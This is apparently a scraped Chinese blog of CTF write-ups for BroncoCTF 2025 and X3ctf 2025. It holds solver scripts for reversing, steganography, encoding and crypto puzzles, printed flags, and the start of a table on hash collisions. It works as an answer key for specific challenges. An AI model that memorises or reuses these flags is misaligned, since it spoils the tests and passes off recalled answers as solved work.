1bronco&#123;grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact&#125; ReverseReversing for Ophidiophiles 这道题我们会得到以下内容： 123a326c27bee9b40885df97007aa4dbe410e93 1234567891011121314flag = input()carry = 0key = &quot;Awesome!&quot;output = []for i,c in enumerate(flag): val = ord(c) val += carry val %= 256 val ^= ord(key[i % len(key)]) output.append(val) carry += ord(c) carry %= 256print(bytes(output).hex()) 直接用python写一段逆向的算法便可以得到flag： 123456789101112131415encrypted_hex = &quot;23a326c27bee9b40885df97007aa4dbe410e93&quot;encrypted_bytes = bytes.fromhex(encrypted_hex)carry = 0key = &quot;Awesome!&quot;flag = []for i, val in enumerate(encrypted_bytes): val ^= ord(key[i % len(key)]) # 逆向 XOR 操作 val = (val - carry + 256) % 256 # 逆向 carry 计算 flag.append(chr(val)) carry = (carry + val) % 256 # 重新计算 carry 值print(&quot;&quot;.join(flag))# bronco&#123;charge_away&#125; theflagishere! 这道题我们会得到一份Python 编译后的字节码文件 “theflagishere.pyc”，我们首先用这个网站将其反汇编： https://www.lddgo.net/string/pyc-compile-decompile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.9def what_do_i_do(whoKnows): a_st = &#123; &#125; for a in whoKnows: if a_st.get(a) == None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] continue return (not_a_variable_name, variable_name)def char_3(): return &#x27;m&#x27;def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def i_am_a_function(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 newVariable = variableName * i newVariable += 100 variableName /= i + 1 return chr(ord(chr(int(variableName))))def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;def i(): return &#x27;free_flag_f&#x27;def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinteresting 然后用python写一段逆向的脚本即可得到flag （主要内容其实就是复制粘贴）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105def what_do_i_do(whoKnows): a_st = &#123;&#125; for a in whoKnows: if a_st.get(a) is None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] return (not_a_variable_name, variable_name)def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinterestingdef i(): return &#x27;free_flag_f&#x27;def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_3(): return &#x27;m&#x27;def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;# 拼接 flagflag = ( char_0() + char_1_4_6() + char_2_5_9() + char_3() + char_1_4_6() + char_2_5_9() + char_1_4_6() + char_7() + char_8() + char_2_5_9() + char_10())print(&quot;Recovered flag:&quot;, flag)# i_am_a_flag# bronco&#123;i_am_a_flag&#125; ForensicsQR Coded 这道题我们会得到一张二维码： 直接扫描（https://scanqr.org/）会得到一个fake flag： 用Stegsolve打开并调整到Gray bits会得到另外一张二维码： 扫描后会得到真正的flag： 1bronco&#123;th1s_0n3_i5&#125; Uno 这道题我们会得到这样一张图片： 根据题目描述（”a significant bit of the cards were left on the plane I was on.“）我们猜测这道题用的是LSB隐写了ASCII码，所以我们用StegSolve打开图片，利用其Data Extract模块进行查看。这个模块可以查看RGB三种颜色的每一个通道，并且按照（自选的）一定的排列顺序显示每个通道的Hex和ASCII码字符： 最后，根据题目描述中的 “the numbers really speak to me…” 这一句，尝试各种由 2、3、4、5 组成的组合，便可以得到 flag： 1bronco&#123;no_un0_y3t&#125; Wordlands 我们会得到这张图片： 经过一番尝试后，当用StegSolve打开图片，利用其Data Extract模块进行查看时可以发现： 8BPS是标准的Photoshop 的.psd 文件有固定的文件头，所以我们点击“Save Bin”将其存为wordlands.psd，并用这个网站打开它： https://www.photopea.com/ 可以发现这里有所有图片创作的信息（图层之类的）。最后根据line的图层的顺序进行拼接便可以得到flag： 比如说Shape1这个图层里的线连接了b和r，表示开头为br 然后是(b)ro，以此类推… 1bronco&#123;i_love_admiring_beautiful_winter_landscapes&#125; MiscTick Tock 这道题我们首先会得到这张图片： 经过多次尝试可以在StegSolve的Data Extract模块里发现有一长串由“tick”和“tock”组成的内容： 1ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock 写一段python将tick替换成0，tock替换成1然后当成二进制内容进行解码会得到： 1234567891011121314151617def ticktock_to_binary(text): return text.replace(&quot;tick&quot;, &quot;0&quot;).replace(&quot;tock&quot;, &quot;1&quot;)text = &quot;ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock&quot;text = text.replace(&quot; &quot;, &quot;&quot;)binary = ticktock_to_binary(text)print(binary)# 01110001 01100111 01100100 01100011 01110010 01100100 01111011 01110101 01111000 01101011 01110100 01011111 01100010 01111000 01100011 01101010 01101001 01110100 01101000 01011111 01101010 01100011 01101001 01111000 01100001 01011111 01100010 01111000 01110011 01100011 01111000 01110110 01110111 01101001 01111101content = &#x27;&#x27;.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))print(content)# qgdcrd&#123;uxkt_bxcjith_jcixa_bxscxvwi&#125; 最后通过遍历凯撒密码便可以得到flag： 1bronco&#123;five_minutes_until_midnight&#125; 比赛官方GitHubhttps://github.com/SCUBroncoSec/BroncoCTF-2025-Public","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]},{"title":"X3ctf2025 Write Up","slug":"CTF/Writeup/X3ctf2025-Write-Up","date":"2025-03-10T12:25:08.000Z","updated":"2025-03-29T19:01:01.170Z","comments":true,"path":"2025/03/10/CTF/Writeup/X3ctf2025-Write-Up/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/Writeup/X3ctf2025-Write-Up/","excerpt":"x3ctf比赛的题解，涉及方向：Misc, Crypto","text":"Miscp11n-trophy（签到题）:题目描述： 我们首先会得到这样一份证书： 第一题签到题的答案就是证书下面正中间的“This certificate does not grant the rank of Master”。 trophy-plus + trophy-plus64:这两道目描述一模一样 其中一个flag是藏在certificate周围一圈的位置： 人工将这些内容识别，再翻译成二进制然后解码就会得到flag 1234567891011121314151617181920212223242526272829303132def decode_binary(content, mapping): # Convert content to binary using the mapping binary_str = &#x27;&#x27;.join(mapping[char] for char in content if char in mapping) # Split the binary string into 8-bit chunks bytes_list = [binary_str[i:i+8] for i in range(0, len(binary_str), 8)] # Convert each 8-bit chunk to a character decoded_text = &#x27;&#x27;.join(chr(int(byte, 2)) for byte in bytes_list if len(byte) == 8) return decoded_text# Input stringc_1 = &quot;MVVVVMMMMMVVMMVVMVVMMMVVMVVVVMVVMVVM VMMV MV MVVVVVMVVMM VMM MMVVMMMV&quot;c_2 = &quot;MVVMM VMMMVVMVVVMMM VMMVVVMVVVMV MMM VMVVVVVMVVM VMVVMVVMVVVMMMVVMMMMMVVVMVVVM VMVVVVV&quot;c_3 = &quot;VMMMVVMMM VMMMVVMVVVVVM VMMV MMVVVMMMMMVVMMMVVMMVVMVVVVVM VMMM VMMVVMVVMMVVMMVVMMVVVM VMV MVVVMVVVVVM VM VM VMMVVMMV MMMVVMVVVVVMV MMMV MMVVMMMVVMVVM VMV MVVVMMMMMVVMMVVMMMVVMVVVVVM VMV MVVMVVMMVVMVVVM VMVVMVVM&quot;reversed_c_3 = c_3[::-1]c_4 = &quot;MMV MMVVMMMMMVVMMVVMMMVVMMVVVMVVMVVMMVVMMVVVVVM VMV MMVVVVMMV MMVVVMMM VMVVMMMVVVMVVM&quot;reversed_c_4 = c_4[::-1]c_5 = &quot;MMVVMMM VMVVMVVVMMVVMMVVVM VMVVVVVMVVMVVMMMMVVMMMMMVVMVVMMMVVVVVMV&quot;# mapping = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;mapping1 = &#123;&#x27;M&#x27;: &#x27;1&#x27;, &#x27;V&#x27;: &#x27;0&#x27;&#125;mapping2 = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;# print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(c_3, mapping2) + decode_binary(c_4, mapping2) + decode_binary(c_5, mapping2) )print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(reversed_c_3, mapping2) + decode_binary(reversed_c_4, mapping2) + decode_binary(c_5, mapping2) )# 输出结果：x3c&#123;i_d1dn&#x27;t_kn0w_mvm_c0uld_be_us3d_f0r_b1n4ry_3nc0d1ng_l0l&#125; 另外一个flag则是藏在右下角的勋章里： 人工将这些内容识别出来然后用base64进行解码即可。 内容大概为： 12345678910111213141516171819202122232425262728-----BEGIN CERTIFICATE-----MIIDyjCCAlCgAwIBAgISBKmF/S4TYSXpTzcor9eZJ/GrMAoGCCqGSM49BAMDMDIxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEwlMZXQncyBFbmNyeXB0MQswOQYDVQQDEwJFNjAeFw0yNTAxMDYyMDM2MDFaFw0yNTA0MDYyMDM2MDBaMEAxPjA8BgNVBAMMNXgzY3ttdTV0X2IzX2Zlbl90eXAxbmdfdGgxcl9ieV9oNG5kXzEzNzUxMDUzMDQyNDgzNjF9MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEcYu3flnEI2dttI5lQQmzRld72SDdBqCDtfto9pg5t/NFFIolkY8W8CryM9XlJEx3NAOGTgBoeUNTuWgiCseQeaOCAjYwggIyMA4GA1UdDwEB/wQEAwIHgDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwDAYDVR0TAQH/BAIwADAdBgNVRQ4EFgQUrbtyF28hjw8oIqwXpakw8t7J9jQwHwYDVR0jBBgwFoAUkydGmAOpUWiOmNbEQkjbI79YlNIwVQYIKwYBBQUHAQEESTBHMCEGCCsGAQUFBzABhhVodHRwOi8vZTYuby5sZW5jci5vcmcwIgYIKwYBBQUHMAKGFmh0dHA6Ly91Ni5pLmxlbmNyLm9yZy8wQAYDVR0RBDkwN4IleDNje2llNXRfYjNfZnVuX3R5cDFuZl90aDFzX2J5X2g0bmRfMTM3NTEwNTMwNDI0ODM2MX0wEwYDVR0gBAwwCjAIBgZngQwBAgEwggEDBgorBgEEAdZ5AgQCBIH0BIHxAO8AdQB9WR4S4XggexxhZ3xe/fjQhlw0oE6VnrkDL9kOjC55uAAAAZQ9inTEAAAEAwBGMEQCIENpWRg98SQo5JdzyjgnyFeUY0WnNVzn5NkdDA3bzeKbAiBsAkk3fe5esm7A0efsLN/EyFjEK/NBGqYxgOucgZheQwB2ABNK3xglmEIjeAxv70x6kaQWtyNJzlhXat+u2qfCq+AiAAAB1D2KdXoAAAQDAEcwRQIgBfU4pkiNyNsl+I6skjXz6qqu+mNoI4JvtDsoYxoI+ZoCIQCRiMQSCEwahN0ImXu3cwDeyM+AbNeve0VgSLMSUBdxvTAKBggghkjOPQQDAwNoADBlAjEAvxa6nSpUMl7NuDB/+LJfzTskR498vLoetnZuHo14J6d9zuFRGQ8Dk4w2aQNsbuVsAjB9fE6GJYBiebb4aHu/J2amych3KP//D951/CdmiV5PKZqXWWdpaQZL+pbmsXRa8rM=-----END CERTIFICATE----- 会有一些误差，所以最后提交flag时需要多试几次。 foundations （Osint）：题目描述： 使用https://archive.org/来搜索这个比赛网站的历史纪录内容 可以在这里发现最早的纪录是在2024年7月14日： 点进去会发现： x3CTF{m4yb3_w3ll_m4ke_4_ch4ll3nge_0u7_0f_7h1s} mvm： 打开下载文件会得到 12MMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVVVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVM 跟之前一样，将其转成二进制再解码会得到 1++[----------&gt;+&lt;]&gt;.+++++++++.---------.-[-&gt;+++++&lt;]&gt;-.+[-----&gt;+&lt;]&gt;+.+++++++++.---------.-[----&gt;+++++&lt;]&gt;.+[---&gt;++&lt;]&gt;++.&gt;-[---&gt;+&lt;]&gt;---.--[-&gt;++++&lt;]&gt;+.++++++++.+++++.[--&gt;+++++++++&lt;]&gt;.[---&gt;+++++&lt;]&gt;.++++++++++.++++++++++++.-[-----&gt;+&lt;]&gt;.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.------.-.++[-&gt;+++++&lt;]&gt;+.[-----&gt;++++&lt;]&gt;+.+++++++++.---------.&gt;--[--&gt;+++&lt;]&gt;. 很显然这是Brainfuck,所以找个在线的intepreter运行一下就可以得到flag： MVM{MVM_BRAIN_IS_FUCKED_MVM} count-the-mvms主要是数背景的mvm个数，发现它们的像素点是一样的。所以写个图像匹配脚本即可. 首先要把pdf转换成 png，推荐 adobe acrobat 123456789101112131415161718192021222324252627282930313233343536import cvlib# cvlib 是自己写的库im = cvlib.read_img(&quot;certificate_h4tum.png&quot;)sim = cvlib.subrectimg(im, 605, 516, 837, 665)sim2 = cvlib.subrectimg(sim, 44, 32, 79, 48)mvm = cvlib.subrectimg(sim2, 2, 2, 32, 13)print(&quot;read success&quot;)def match(im, x,y): if x+len(mvm) &gt; len(im): return False if y+len(mvm[0]) &gt; len(im[0]): return False for i in range(len(mvm)): for j in range(len(mvm[i])): [r,g,b] = mvm[i][j] [ri,gi,bi] = im[x+i][y+j] if r != ri or g != gi or b != bi: return False return True def count_matches(im): cnt = 0 for i in range(len(im)): print(i) for j in range(len(im[i])): if match(im, i,j): cnt += 1 j += len(mvm[0]) - 1 return cntprint(count_matches(im))print(&quot;finish&quot;) Cryptoman-vs-matrix:题目描述： 打开下载文件会看到： 1234567891011121314151617181920212223242526272829303132from sage.all import *from Crypto.Util.number import bytes_to_longclass RNG: def __init__(self, seed): self.p = next_prime(2**24) # 16777259 self.F = GF(self.p) self.M = matrix(self.F, 3,3, [bytes_to_long(seed[i:i+3]) for i in range(0, len(seed), 3)]) self.state = vector(self.F, map(ord, &quot;Mvm&quot;)) # [77, 118, 109] self.gen = self.F(2) def get_random_num(self): out = self.M * self.state for i in range(len(self.state)): # len = 3 self.state[i] = self.gen**self.state[i] return out * self.stateflag = b&quot;MVM&#123;???????????????????????????&#125;&quot;seed = flag[4:-1] # 27位，27/3=9rng = RNG(seed)samples = []for i in range(9): samples.append(rng.get_random_num())print(f&quot;&#123;samples = &#125;&quot;)# samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781] 是几个随机数的生成器（RNG），但生成逻辑非常简单。 每次会计算 (\\text{M} \\cdot \\text{state}) \\cdot \\text{new\\_state}(括号外的乘法是内积。在sage里，矩阵与矩阵/向量的乘法和向量与向量的内积都是用*)。并且有 \\text{new\\_state}[i] = 2^{\\text{state}[i]}.这里的初始state是已知的，所以我们只需要建立一个9元1次线性方程组即可。 我们可以写一段sagemath的代码来通过解方程逆推出matrix以及flag内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162p = 16777259 # = next_prime(2**24)F = GF(p)samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781]# 初始状态 S0 = [77, 118, 109]S0 = vector(F, [77, 118, 109])def next_state(st): return vector(F, [F(2)^int(x) for x in st])# 求出 S0 ~ S9S = [None]*10S[0] = S0for i in range(1, 10): S[i] = next_state(S[i-1])# 构造线性方程组 X * M_vec = YX = matrix(F, 9, 9)Y = vector(F, 9)for i in range(9): row_coeffs = [] # M_vec 的顺序: M[0,0], M[0,1], M[0,2], M[1,0], ..., M[2,2] for k in range(3): for j in range(3): row_coeffs.append(S[i][j] * S[i+1][k]) X[i] = row_coeffs Y[i] = samples[i]# 求解 9 个未知量M_vec = X.solve_right(Y)M_mat = matrix(F, 3, 3, M_vec)print(&quot;Recovered M =&quot;)print(M_mat)# 将 3x3 矩阵以行优先顺序（row-major）展开成 9 个元素# 对应当初 [bytes_to_long(seed[0:3]), bytes_to_long(seed[3:6]), ..., bytes_to_long(seed[24:27])]m_ints = []for i in range(3): for j in range(3): # Sage 返回的是 GF(p) 的元素，先转成普通整型 val = int(M_mat[i, j]) m_ints.append(val)# 将每个 val 转成 3 字节后依次拼接seed_recovered = b&quot;&quot;.join(val.to_bytes(3, &quot;big&quot;) for val in m_ints)# 最终还原 flag = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;flag_recovered = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;print(&quot;Recovered seed =&quot;, seed_recovered)print(&quot;Recovered flag =&quot;, flag_recovered)#最后得到的结果：# Recovered M =# [7090542 3355762 6252149]# [5137236 3223662 3497780]# [7484255 7174495 6698102]# Recovered seed = b&#x27;l1n34r_fuNcT10n5_4r3_my_f4v&#x27;# Recovered flag = b&#x27;MVM&#123;l1n34r_fuNcT10n5_4r3_my_f4v&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]},{"title":"哈希加密的长度与碰撞情况","slug":"CTF/Crypto/哈希加密的长度与碰撞情况","date":"2025-03-09T18:36:57.000Z","updated":"2025-03-29T18:54:16.080Z","comments":true,"path":"2025/03/09/CTF/Crypto/哈希加密的长度与碰撞情况/","permalink":"https://archer-baiyi.github.io/2025/03/09/CTF/Crypto/%E5%93%88%E5%B8%8C%E5%8A%A0%E5%AF%86%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%8E%E7%A2%B0%E6%92%9E%E6%83%85%E5%86%B5/","excerpt":"常见的哈希函数的长度及其碰撞情况汇总","text":"以下是各种常见的哈希函数的长度及其碰撞情况汇总： 哈希长度 (bit) 常见算法 碰撞情况 碰撞年份 发明年份 状态 128-bit MD5 存在已知有效碰撞攻击 2004 年 1992 年 已过时，不推荐使用 160-bit SHA-0, SHA-1, RIPEMD-160 SHA-0: 存在已知有效碰撞攻击 SHA-0: 2004 年 SHA-0: 1993 年 SHA-0: 已弃用，不推荐使用 SHA-1: 存在已知有效碰撞攻击 SHA-1: 2017 年 SHA-1: 1995 年 已过时，不推荐使用 256-bit SHA-256, SHA-3-256 暂无已知有效碰撞攻击 - SHA-256: 2001 年 安全，广泛使用 384-bit SHA-384 暂无已知有效碰撞攻击 - 2001 年 安全，高安全性需求 512-bit SHA-512, SHA-3-512 暂无已知有效碰撞攻击 - SHA-512: 2001 年 非常安全，高性能需求 碰撞情况说明 128-bit (MD5): MD5 是一种输出为 128 位的哈希算法，但由于其设计的安全性不足，早在 2004 年就被发现可以有效制造碰撞。 MD5 于 1992 年被发明，不适合任何需要密码学安全性的场景，仅可用于低安全性完整性校验。 160-bit (SHA-0, SHA-1, RIPEMD-160): SHA-0 是 SHA 系列的初代版本，存在严重的设计缺陷，在 2004 年被证明可以制造碰撞。SHA-0 于 1993 年发明。 SHA-1 作为输出 160 位的主流算法，在 2017 年被证实可以通过理论和实践攻击制造碰撞。SHA-1 于 1995 年发明。 RIPEMD-160 虽尚未有公开的碰撞记录，但不如更高位算法安全。 256-bit (SHA-256, SHA-3-256): 目前没有已知的碰撞攻击。 SHA-256 于 2001 